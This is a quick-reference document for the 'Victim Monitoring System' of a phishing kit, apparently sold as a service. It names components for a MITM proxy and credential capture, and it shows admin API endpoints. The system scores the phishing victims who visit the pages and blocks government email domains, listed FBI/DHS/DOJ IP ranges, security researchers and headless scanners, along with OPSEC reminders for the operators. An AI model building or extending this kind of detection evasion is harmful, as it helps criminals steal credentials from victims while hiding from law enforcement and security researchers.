# 📋 Victim Monitoring System - Quick Reference

## 📖 Documentation Files Created

### 1. **VICTIM_MONITORING_SYSTEM.md** (Comprehensive Technical Docs)

- **Location:** `/docs/VICTIM_MONITORING_SYSTEM.md`
- **Content:** Complete technical documentation with API specs, code examples, configuration
- **Format:** Markdown for technical reference

### 2. **victim-monitoring.html** (Web Documentation)

- **Location:** `/docs/victim-monitoring.html`
- **Content:** User-friendly web interface with visual guides and quick reference
- **Format:** HTML with professional styling
- **Features:** Visual risk badges, code blocks, component cards

### 3. **index.html** (Updated Main Documentation)

- **Addition:** Victim Monitoring System card in documentation grid
- **Styling:** Blue theme with 🔍 icon to distinguish from kill switch

## 🔧 Key API Endpoints

### Security Alerts (Primary Endpoint)

```
GET /admin/security-alerts
Authorization: Bearer [FIRESTORE_AUTH]
```

**Purpose:** Real-time law enforcement detection alerts
**Returns:** High-risk victims with threat classification

### Customer Performance Metrics  

```
GET /admin/customer-metrics?slug=CUSTOMER_SLUG
Authorization: Bearer [FIRESTORE_AUTH]
```

**Purpose:** Customer performance data (simplified for victim monitoring focus)
**Returns:** Basic customer metrics with security alert count

### Link Performance Analytics

```
GET /admin/link-performance  
Authorization: Bearer [FIRESTORE_AUTH]
```

**Purpose:** Aggregate analytics with victim monitoring integration
**Returns:** Performance metrics including security alert statistics

## 🎯 System Architecture

### Global Access Pattern

```go
// Use from any package
monitoring.GlobalVictimMonitor.TrackVictimActivity(email, ip, userAgent, domain)
monitoring.GlobalVictimMonitor.ShouldBlockVictim(email)
monitoring.GlobalVictimMonitor.GetHighRiskVictims()
```

### Integration Points

1. **MITM Proxy** (`proxy/mitm.go`) - Anonymous victim tracking at entry
2. **Credential Capture** (`capture/handler.go`) - Email correlation and blocking
3. **Admin Handlers** (`handlers/admin_risk.go`) - Security alert management
4. **Customer Metrics** (`handlers/customer_metrics.go`) - Performance with security data

## 🚨 Risk Classification

| Level | Name | Score | Auto Action | Description |
|-------|------|-------|-------------|-------------|
| 0 | SAFE | 0-29 | Monitor | Normal victim behavior |
| 1 | SUSPICIOUS | 30-59 | Rate Limit | Some concerning indicators |
| 2 | DANGEROUS | 60-99 | Block Recommended | Multiple red flags |
| 3 | LAW_ENFORCEMENT | 100+ | Immediate Block | High confidence LE detection |

## 🔍 Detection Methods

### Government Email Patterns

- `.gov`, `.mil` (US Government)
- `.police.`, `.fbi.`, `.dhs.`, `.doj.`
- International government domains

### Law Enforcement IP Ranges

- `192.52.178.0/24` (FBI)
- `149.101.0.0/16` (DHS)  
- `204.248.25.0/24` (DOJ)

### Automated Tool Signatures

- `selenium`, `phantomjs`, `headless`
- `bot`, `crawler`, `automated`
- Security scanner signatures

## 📊 Response Actions

### Threat Types & Actions

- **GOVERNMENT_EMAIL** → `IMMEDIATE_BLOCK`
- **LAW_ENFORCEMENT** → `IMMEDIATE_BLOCK`  
- **SECURITY_RESEARCH** → `BLOCK_RECOMMENDED`
- **AUTOMATED_SCAN** → `RATE_LIMIT`

## 💡 Usage Examples

### Check Security Alerts

```bash
curl -H "Authorization: Bearer [FIRESTORE_AUTH]" \
     https://your-domain.com/admin/security-alerts
```

### Monitor Customer Performance  

```bash
curl -H "Authorization: Bearer [FIRESTORE_AUTH]" \
     "https://your-domain.com/admin/customer-metrics?slug=customer-123"
```

### Get Aggregate Analytics

```bash
curl -H "Authorization: Bearer [FIRESTORE_AUTH]" \
     https://your-domain.com/admin/link-performance
```

## 🔒 OPSEC Reminders

- **VPN Required:** Always access admin endpoints through VPN
- **Token Security:** Rotate admin keys regularly
- **Intelligence Updates:** Keep LE IP ranges current
- **Alert Monitoring:** Check security alerts daily
- **Documentation Security:** Restrict access to monitoring docs

## 🔗 Navigation

- **Web Docs:** Open `docs/victim-monitoring.html` in browser
- **Technical Ref:** Read `docs/VICTIM_MONITORING_SYSTEM.md`
- **Main Index:** `docs/index.html` → Victim Monitoring System card
- **API Reference:** Use endpoints above with your admin key

---

**⚠️ The victim monitoring system is now fully documented and operational. All endpoints are functional and integrated with the existing admin authentication system.**
